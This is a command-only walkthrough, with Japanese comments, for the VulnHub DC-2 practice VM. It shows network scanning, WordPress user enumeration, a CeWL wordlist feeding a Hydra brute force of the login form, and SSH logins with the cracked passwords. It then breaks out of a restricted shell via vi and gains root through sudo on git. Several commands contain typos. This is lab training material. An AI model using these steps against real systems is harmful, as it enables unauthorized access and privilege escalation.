# VulnHub: DC-2 Walkthrough

```bash
# ネットワーク情報の確認
ip -4 addr show dev enp03

# アクティブなホストを特定
for ip in $(seq 1 254); do (ping -c 1 192.168.56.$ip 2>/dev/null | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &); done

# ターゲットIPを設定
export IP=192.168.56.105
echo $IP

# ポートスキャン
nmap -sC -sV $IP --open -p-

# HTTPアクセス → リダイレクト確認
curl -LI $IP

# ホスト名を設定
sudo vi /etc/hosts
# 追加:
192.168.56.105 dc-2

# URL変数設定
export URL="http://$IP:80/"
echo $URL

# ディレクトリ探索
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt

# WordPressユーザー列挙
http://dc-2/?author=1
http://dc-2/?author=2
http://dc-2/?author=3
http://dc-2/?author=4
http://dc-2/?author=5

nmap -p80 --script http-wordpress-users $IP
ls
cat users.txt

# CeWLでワードリスト生成
which cewl
git clone https://github.com/digininja/CeWL
cd CeWL/
sudo gem install bundler
bundle install
chmod u+x ./cewl.rb

ping -c 1 $IP
./cewl.rb dc-2
./cewl.rb dc-2 -w ../cewl.txt
head ../cewl.txt

# Hydraでブルートフォース
hydra -L users.txt -P cewl.txt dc-2 http-form-post 'wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log IN&testcookie=1:S=Location'

# WordPressダッシュボードにアクセス

# SSHログイン
ssh jerry@$IP -p 7744
# パスワード: adipiscing

ssh tom@$IP -p 7744
# パスワード: parturient

# シェル確認とフラグ取得
whoami
id
echo $SHELL
echo $0
pwd
ls -la
cat flag3.txt

# ユーザー探索
cd usr
ls -la ./usr
export -p
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
vi flag3.txt

vi
set shell=/bin/sh
shell

echo $SHELL
echo $0
ls
cat flag3.txt
echo $PATH
whoami
cat flag3.txt

# ユーザー切り替え試行
su jeryy
whoami
id

# 次のフラグ探索
cd
ls -la
cat flag4.txt

# 権限昇格調査
sudo -l
sudo git -p help config

# シェル起動
!/bin/bah

# rootフラグ取得
whoami
id
cd /root
pwd
ls
cat final-flag.txt
```
